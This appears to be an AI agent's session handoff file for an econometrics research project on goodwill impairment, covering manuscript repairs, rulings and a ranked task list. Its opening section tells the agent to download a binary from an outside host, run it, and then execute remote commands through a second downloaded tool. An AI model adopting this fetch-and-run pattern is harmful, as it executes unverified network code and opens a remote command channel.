---
project: wealth-tensor
gh_sha: 91e595a
updated: 2026-08-13
session: wealthTensor-20
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

---

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**First collect has now worked -06 through -20 without exception.** -17 proved the pipe survives
the bridge dropping; -18 proved it survives the host rebooting. Never restart anything to fix
darlish, and do not re-enrol after a reboot — just call `dx`.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-21 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-21 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` before any `lessons.py add`. Three leaves banked this session,
two global and one project-scoped.

**Never inline a multi-line string in a `dx '...'` argument.** Write a local file, `--put` it,
run it — used four times this session with no incidents, and it is what makes an apostrophe-heavy
`lessons.py add` survive. `dx --get` fails on binary; base64 both ways, and macOS base64 wants
`-i/-o`, not a positional filename. Quote remote paths. Exit 3 = never reached darwin, safe to
re-run; exit 4 = started, check state first. Use `./.venv/bin/python` — `python3 -m pytest` dies at
collection because scipy lives only in the venv. **286 tests, ~40 s.**

The roster contention warning naming YOU is still noise. Carded on State Machine
`1217420907841952`. Do not spend a turn on it.

---

## THE FIVE THINGS THAT HAVE EACH COST A SESSION A RUN — read this first

The first four are one mistake: **reconstructing registered machinery from its signature instead
of copying its call site.** The fifth is its mirror in prose.

1. `extract_events` defaults to `onset_rule="streak"`, which is PRE-001. The registered
   PRE-002/REG-003 sample is `onset_rule="peak"`. Call site: `wt089_harvest.py:83` —
   `include_annual_attributed=True, onset_rule="peak", signal="revenue"`. Copy it.
2. `peak_onset` returns a **TUPLE** `(onset, censored)`, so `if … is not None` is always true and
   inflates the risk set. The real logic is `wt089_riskset.eligible_quarters`, fourteen lines.
3. **ALWAYS RUN THE UNCHANGED ARM AS A CONTROL, IN THE SAME PASS.** -19 promoted this to a
   registered falsifier (REG-007 F8). **-20 found the manuscript violating it** — see §1.
4. The committed **PANEL** is registered machinery too. `data/reg-006-wt092-panel.json` carries
   `cik, sic, universe` and per-`fy_end` `t0/t1/t2/G/G_present/A` for 1,602 firms. Re-read it; do
   not rebuild it from `edgar.py`. REG-007 §3.1 forbids the rebuild in writing.
5. **NEW, -20 · A DANGLING ORDINAL IS RECOVERABLE, NOT UNKNOWABLE — AND THE RECIPE IS ONE
   COMMAND.** -19 correctly refused to guess which row §7's "The fifth" meant, and then spent a
   handoff item on it. Wrong stopping point. Positional prose and its referent were correct
   *simultaneously* at exactly one revision, and git can take you there:

   ```
   git log --oneline -S"<the distinctive sentence>" -- <path>      # the commit that WROTE the prose
   git show <commit>:<path> | awk '/<section>/,/<end>/' | grep -n '^| \*\*'   # count rows AS THE AUTHOR SAW THEM
   ```

   That resolved it in one pass, and confirmed itself twice over: at `85d578b` the fifth row was
   **"The inversion spares the lag statistic"**, and that row still carried the italic tag *the
   check that overturned this paper's own draft claim*. Now named. Use this before carding any
   "whoever knows which one it is" item.

### `severity.check`'s witness contract

A zero-argument callable returning **the SAME PREDICATE evaluated on a world where the claim is
FALSE**, which must come back falsy. Returning the raw quantity makes the guard VACUOUS and the run
dies with PHANTOM TAG. The falsifying world must be RUNNABLE. Copy
`wt092_sequencing_vs_coupling.py:172`'s call site rather than reconstructing the signature.

### Editing the manuscript

`scripts/patchkit.py`, `apply_edits`, **never sed**. Copy anchors out of a `dx --get` copy WITH
THEIR LINE BREAKS and WITH their leading indentation. Anchor on a span with no internal newline
where you can; where you cannot (a re-wrapped paragraph), re-emit the whole block. **Re-wrap to
100 columns when a replacement lengthens a line** — -20's §7 fix grew the first line by 40
characters and had to re-flow the paragraph. Four anchors, two files, first try, no incidents.

---

## 1 · WHAT HAPPENED — THE AT-BAT'S TOP ITEM DISSOLVED, AND A REAL DEFECT WAS UNDER IT

Two commits: `19ebc2d` (three manuscript/result repairs) and `91e595a` (F11). 286 tests green,
structure unchanged — 2 `#`, 15 `##`, 29 `###`, 17 `---`; paper III **2,635 lines**; gate PASS;
tree clean and pushed.

**§5.4's property cell was comparing against the wrong baseline, and this is the session's find.**
It read *"Property with goodwill runs at **4.35×** and **4.03×** … `REG-006` repairs the omission
and re-derives that cell at **3.99×** and **2.17×**"* — published-crawl numbers on the left,
new-crawl corrected on the right, with the whole movement attributed to the repair. RESULT-REG-006
§2.1 gives the **same-crawl** original:

| PP&E × goodwill | same-crawl original | corrected |
|---|---|---|
| retail | 3.63× (p 0.038, 4 obs) | **3.99× (p 0.0012, 14 obs)** |
| computer services | 4.14× (p 0.0096, 5 obs) | **2.17× (p 0.085, 8 obs)** |

On one crawl **the repair RAISES retail** and gains it ten observations. The published-versus-
corrected juxtaposition showed it falling. The conclusion — cross-sector agreement does not survive
the repair — is unchanged and now *better* supported, because 3.63/4.14 agree and 3.99/2.17 do not.
But the attribution was backwards, and it was backwards in exactly the shape REG-007 F8 registers a
falsifier against. **The tell was one sentence away:** the very next sentence says *"The headline
does: 4.01× and 2.10× repaired, against 4.01× and 2.01× from the same crawl unrepaired."* A section
that states its control idiom in one sentence and drops it in the sentence before is telling you
where to look. Banked globally.

**The at-bat's #1 item dissolved on inspection, which is a better outcome than doing it.** -19
ranked first the two retail cells the repaired instrument can see (PP&E × finite 0.00× → **7.70×**,
PP&E × indefinite 3.27× → **6.33×**), on RESULT-REG-006 §2.2's statement that *"the paper reports"*
them. **The manuscript does not, and never has** — `git log -S"0.00×"` against paper-III returns no
commit, and §5.4 prints only the goodwill-paired cells. The zero lives in the ladder's run log.
There is no printed measured zero to correct, so "empty-versus-absent in its fifth costume" was a
costume on a result doc, not on the paper. Sentence corrected; **ruling recorded in RESULT-REG-006
§2.2 — see §4.**

**§7's ordinal is fixed by name, not by guess.** See item 5 above.

**F11 is closed.** FRM §9510.2 cites S-K **303(a)(3)(ii)**. That designation **has no referent in
the CFR in force**: Release 33-10890 (Nov 2020) restructured Item 303 so paragraph (a) is the
Objective with *no numbered subdivisions at all*. The known-trends-or-uncertainties requirement
§9510.2 is reaching for is **17 CFR 229.303(b)(2)(ii)**; the liquidity twin is **(b)(1)(i)**.
Checked against eCFR directly, not a practitioner reproduction. **The FRM is frozen, not wrong** —
Topic 9 still reads *"Last updated: December 31, 2009"*, eleven years before the amendment — so
REG-007 §1's reliance on §9510.1–9510.3 for *the no-charge case is MD&A-driven* stands (the
requirement moved, it did not disappear), but any **paragraph number** from the FRM is presumptively
stale. Nothing printed depends on it; if anything ever does, it cites **303(b)(2)(ii)**.

---

## 2 · WHAT -20 DID NOT TOUCH

REG-007's Λ result, the placebo, the phrase set, the keyword families, the 0.436/0.403 pair — all
untouched and all still standing exactly as -19 left them. Nothing this session re-ran an
instrument; every change is a documentation or attribution repair backed by numbers already
committed. That is why 286 tests were enough.

---

## 3 · PRIOR ART — the two -19 leads, checked and cleared (bounded sweep)

* **Cready, Lopez & Sisneros (2012)** is *"Negative Special Items and Future Earnings: Expense
  Transfer or Real Improvements?"* — special items as an aggregate, earnings-persistence framing.
  No test-sequencing content.
* **Hirschey & Richardson (2002)** is *"Information Content of Accounting Goodwill Numbers"* —
  value relevance of write-offs. No test-sequencing content.

Both are about the *consequences* of special items, which is why AZG&S cite them as event-study
contamination. **Recorded as "not found by keyword search", not as "does not exist"** — the sweep
was titles/abstracts only; neither full text was read, and Scholar/SSRN remain blocked as -19
found. **The nearest adjacent framing is Cready et al.'s "expense transfer"** — a substitution
story about special-item *components*, which is closer to REG-006's suppressing channel than
anything in AZG&S. Worth a real read if the sequencing literature question is ever reopened; it is
the best lead in the file. The gap still looks real.

---

## 4 · RULINGS — DO NOT REOPEN

* **The two retail PP&E × intangible cells STAY OUT of §5.4.** Ruled -20, recorded in
  RESULT-REG-006 §2.2. They are couplings the repair **discovered**, not published claims the
  repair **revised**. REG-006 registered the re-derivation of *published* cells; promoting cells
  that became significant under the repair is a **new registration**, not an amendment. This is the
  at-bat item -19 ranked first; it is closed, and reopening it needs a registration, not a ruling.
* **§4.4's table is SETTLED.** Ruled -18 after a two-round conversation. Both the α̂ = 0.408 column
  and the "the calibration" label; neither move survives alone. Off the at-bat list permanently.
* **The `## References` provenance block STAYS AS IT IS.** Ruled -16.
* Jason's standing test, stated -18: *"will the econometrician be able to follow the line of
  thought?"* Reader before referee. Across three papers the pieces fit like Lego.

---

## 5 · THE PAPERS

Paper III — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,635 lines** (was 2,634).

| § | what changed this session |
|---|---|
| 5.4 | the property cell gains its same-crawl control (3.63×/4.14×) and the repair's true direction; `runs at` → `was published at` |
| 7 | `The fifth` → **the row named**, paragraph re-wrapped |

`docs/preregistration/RESULT-REG-006.md` §2.2 — "the paper reports" → "the ladder returns", plus a
dated correction-and-scope-ruling paragraph. `RESULT-REG-007.md` F11 — closed.

---

## 6 · THE AT-BAT, RANKED

1. **THE NEXT DISCLOSURE INSTRUMENT IS A PARSING PROBLEM, NOT A LEXICON PROBLEM.** Do not answer
   REG-007's null with a bigger keyword list: the registered families reach 0.436 in the mandated
   window and 0.403 in the placebo, and adding keywords moves **both**. What separates them exists
   only in event-specific narrative — the **named reporting unit**, the **dated trigger**, the
   **charge amount tied to the sentence**. Sentence-level parsing keyed on the reporting-unit name.
   New registration. Fold in the two dead keywords and the corrected *"composition **or carrying
   amount** of its net assets"* wording while you are there; both are registered territory, not
   patches. **`data/reg-007-passages.json.gz` IS COMMITTED** (3.7 MB, 1,925 firm-years, 9,852
   passages) — read it instead of re-crawling. The harvest was ~7 minutes for ~2,600 SEC requests
   at 6 workers; there is no reason to pay that twice.
2. **SWEEP THE MANUSCRIPT FOR THE OTHER BASELINE-SUBSTITUTIONS.** -20 found one comparison using a
   published number where a same-run control existed. It was found by reading, not by a check, and
   there is no reason to think it is the only one. Cheap and mechanical: grep paper III for every
   `→`, every `against`, and every `repairs`/`re-derives`/`corrected` sentence, and for each ask
   *which run produced the left-hand number*. This is the highest-value hour in the file precisely
   because §7 advertises the discipline the body dropped.
3. **THE σ-AND-LIFETIME RESULT STILL NEEDS NEW DATA.** Realised return volatility and disclosed
   useful lives are not in this sample. Do not proxy — WT-038, a three-time payer.
4. **Cready et al. (2012) full text**, if the prior-art question is reopened. §3 says why.

---

## 7 · DO NOT

* **ASK A SUBAGENT FOR ITS UNVERIFIED LIST EXPLICITLY.** Best output of both -19 subagents was
  refutation: AZG&S does *not* flag the sequencing gap; the "not all-inclusive" language is
  `350-20-35-3F`, not `35-3C`; `350-20-35-31` is a four-sentence paragraph whose parenthetical sits
  in the second; and **IAS 36 ¶104 and ASC 350-20-35-31 RUN IN OPPOSITE DIRECTIONS** — ¶104 is a
  loss-allocation waterfall hitting goodwill first, 35-31 is a test-ordering rule writing other
  assets down *before* the goodwill test. Never cite one for the other. FASB's own server returns
  403 to everything; all Codification text is practitioner reproduction, and that limit lives in
  RESULT-REG-007 §3 F9/F10 and must stay there.
* Do not read §5.4 as a rescue of PRE-001. REG-003 §7 ruled it out in writing before the number
  existed; nothing in REG-004/005/006/007 touches it.
* Do not restore *"PRE-001 was doomed by the φδ confound"* — false; wt082, wt083, wt088 E7.
* Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather
  than local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN to
  Ryan (1995). Do not reopen Griliches (1967) — closed with evidence.
* **DO NOT POLISH §4.9, §4.10 or §5.4.** §5.4 has now been amended twice under registered or
  corrective warrant (-19's REG-007 repairs, -20's control repair). Both were defect fixes with a
  number behind them. A third pass without one is polish.
* Do not edit `TIER_TAGS`. PRE-001's constants are a contract; `test_edgar.py` and
  `test_tag_resolution.py` guard them. Corrections live in `TIER_TAGS_REG006`.
* Do not widen REG-007's phrase set or keyword families. Frozen in REG-007 §3.2/§3.3; running them
  as registered — dead keywords and all — is what makes the audit worth anything.
* Do not quote a single "recognition rate" or "effective recognition rate" — §4.10 shows the name
  covers three quantities 15% apart at a three-year life; α_eff is a function of δ.
* Do not report a δ-rectangle share from REG-004 or REG-005 — both complements are empty and both
  were withheld deliberately, in advance.
* Do not read ladders A/R/A3's failure, or REG-007's null, as evidence about the world. F4b showed
  the estimator loses half the signal in a world built to contain it; REG-007's placebo shows its
  classifier reads boilerplate. **A null from an instrument that registered or measured its own
  blindness is a finding about the instrument.**
* Do not hand Jason a ranked list of problems as the deliverable. Do not run a pure-teardown pass.
* Do not invoke Mayo or error-statistical philosophy as a warrant. Pragmatic justification.
* Do not ask him to submit anything. Never add a free parameter to absorb an objection.
* Do not rewrite or summarise the charter inside a handoff.
* Adding a section means DELETING conduct narration elsewhere, not refreshing `.coach-baseline.json`.
* `gate-selfcheck` is PASS. If it fails for you it is new. (The `handoff-lint` warnings it prints
  are on `HANDOFF-floristAlix-2.md`, a different project — not ours, not a blocker.)

---

## 8 · STUDENT-IN — run it, it keeps paying

```
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "<the task>" --scope global,wealth-tensor
```

-17 and -18 skipped this; -19 ran it and it shaped the whole session; **-20 ran it and the
`ANY DEFENSIBLE POSITION: PICK AND GO` leaf is why the two-cells item got a ruling instead of a
card.** Corroborate what you use: `lessons.py use <id> --task <tag>` at student-in,
`lessons.py record-outcome <tag> pass` at wrap.

Three leaves banked this session — two global (**ordinal recovery via `git log -S`**; **repair
comparisons must use the same-run control**) and one project-scoped (**the FRM's S-K numbering is
dead; Topic 9 is frozen at 2009**).
